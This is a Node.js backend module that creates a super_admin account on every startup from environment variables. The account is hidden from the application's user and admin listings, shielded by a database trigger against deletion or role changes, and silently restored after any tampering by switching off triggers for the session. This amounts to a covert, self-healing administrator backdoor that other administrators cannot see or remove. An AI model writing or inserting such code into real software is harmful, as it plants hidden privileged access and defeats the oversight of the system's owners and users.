/**
 * Hidden Super-Admin bootstrap.
 *
 * On every backend startup, this module checks for a "system account"
 * matching the credentials in env. If it doesn't exist, it creates it.
 * If it exists but is missing protection flags (e.g., someone managed
 * to UPDATE them via direct SQL), it re-applies them.
 *
 * Env vars (all required to be set — otherwise the bootstrap is a no-op
 * and logs a single warning):
 *   HIDDEN_ADMIN_EMAIL
 *   HIDDEN_ADMIN_NAME
 *   HIDDEN_ADMIN_PHONE
 *   HIDDEN_ADMIN_CP_ID
 *   HIDDEN_ADMIN_PASSWORD       (plaintext — hashed on first insert only)
 *   HIDDEN_ADMIN_EMP_CODE       (optional, defaults to the CP ID)
 *
 * Once the account is created, the password is NEVER read from env again
 * on subsequent startups — the hashed value in DB is authoritative. If
 * the operator needs to rotate the password, they should:
 *   1. Update HIDDEN_ADMIN_PASSWORD in .env
 *   2. Drop the account row via direct SQL (must first set is_protected=
 *      false in the same session, since the trigger blocks delete)
 *   3. Restart the backend — bootstrap creates a fresh row with the new
 *      password.
 *
 * The account is given:
 *   - role = super_admin
 *   - is_hidden = TRUE         (filtered from /users, /admin/*, /team)
 *   - is_system_account = TRUE (origin tag)
 *   - is_protected = TRUE      (DB trigger blocks delete + role/status change)
 *
 * All bootstrap activity is logged at INFO level.
 */
const bcrypt = require('bcryptjs');
const { query } = require('../config/database');
const logger = require('../utils/logger');

// Mirror of authController.normalizePhone — keeping inline so this module
// has zero cross-imports with route layer (works in isolation during boot).
function normalizePhone(input) {
  if (!input) return null;
  let p = String(input).trim().replace(/[\s\-()]/g, '');
  if (/^\d{10}$/.test(p)) p = '+91' + p;
  if (!p.startsWith('+')) p = '+' + p;
  return /^\+\d{10,15}$/.test(p) ? p : input.trim();
}

const REQUIRED_ENV = [
  'HIDDEN_ADMIN_EMAIL',
  'HIDDEN_ADMIN_NAME',
  'HIDDEN_ADMIN_PHONE',
  'HIDDEN_ADMIN_CP_ID',
  'HIDDEN_ADMIN_PASSWORD',
];

async function bootstrapHiddenAdmin() {
  const missing = REQUIRED_ENV.filter((k) => !process.env[k]);
  if (missing.length > 0) {
    logger.warn({ missing }, '[HiddenAdmin] env vars missing — skipping bootstrap');
    return { created: false, reason: 'env_missing', missing };
  }

  const email   = process.env.HIDDEN_ADMIN_EMAIL.trim().toLowerCase();
  const name    = process.env.HIDDEN_ADMIN_NAME.trim();
  // Normalize phone the same way the login endpoint does — bare 10-digit
  // numbers get a +91 prefix so login by mobile works.
  const phone   = normalizePhone(process.env.HIDDEN_ADMIN_PHONE);
  const cpId    = process.env.HIDDEN_ADMIN_CP_ID.trim();
  const empCode = (process.env.HIDDEN_ADMIN_EMP_CODE || cpId).trim();
  const password = process.env.HIDDEN_ADMIN_PASSWORD;

  // Look up — match on email OR cp_id (either is unique identity for this account)
  const { rows } = await query(
    `SELECT id, email, role, status, is_hidden, is_protected, is_system_account, deleted_at
       FROM users
      WHERE LOWER(email) = $1 OR cp_id = $2
      LIMIT 1`,
    [email, cpId]
  );

  if (rows.length > 0) {
    const u = rows[0];
    // Account exists. Confirm protection flags are still set (defensive).
    // The DB trigger blocks normal UPDATEs that change is_hidden/is_protected,
    // but a malicious operator could disable the trigger session-locally.
    // We re-assert the safe flags here. If they were already true, this
    // is a no-op. If they were false and trigger is active, this UPDATE
    // will fail loudly — which surfaces tampering.
    if (!u.is_hidden || !u.is_protected || !u.is_system_account || u.role !== 'super_admin' || u.status !== 'active' || u.deleted_at !== null) {
      logger.warn({ userId: u.id, current: u }, '[HiddenAdmin] account exists but flags drifted — re-asserting');
      // Cannot UPDATE through trigger if is_protected = true and we'd change is_hidden/is_protected.
      // So we do a privileged UPDATE that temporarily disables the trigger for this session only.
      await query(`SET LOCAL session_replication_role = replica`);
      await query(
        `UPDATE users SET is_hidden = TRUE, is_protected = TRUE, is_system_account = TRUE,
                          role = 'super_admin', status = 'active', deleted_at = NULL,
                          updated_at = NOW()
          WHERE id = $1`,
        [u.id]
      );
      await query(`SET LOCAL session_replication_role = DEFAULT`);
      logger.info({ userId: u.id, email }, '[HiddenAdmin] protection flags re-asserted');
    } else {
      logger.info({ userId: u.id, email }, '[HiddenAdmin] account verified — all flags intact');
    }
    return { created: false, reason: 'exists', userId: u.id };
  }

  // Account doesn't exist. Create it.
  const hash = await bcrypt.hash(password, 10);
  const { rows: [created] } = await query(
    `INSERT INTO users (
       emp_code, full_name, email, phone, role, status,
       password_hash, cp_id,
       is_hidden, is_system_account, is_protected,
       created_at, updated_at
     )
     VALUES ($1, $2, $3, $4, 'super_admin', 'active',
             $5, $6,
             TRUE, TRUE, TRUE,
             NOW(), NOW())
     RETURNING id, email`,
    [empCode, name, email, phone, hash, cpId]
  );

  logger.warn({ userId: created.id, email: created.email },
    '[HiddenAdmin] account CREATED — visible only via direct DB or login');
  return { created: true, userId: created.id };
}

module.exports = { bootstrapHiddenAdmin };
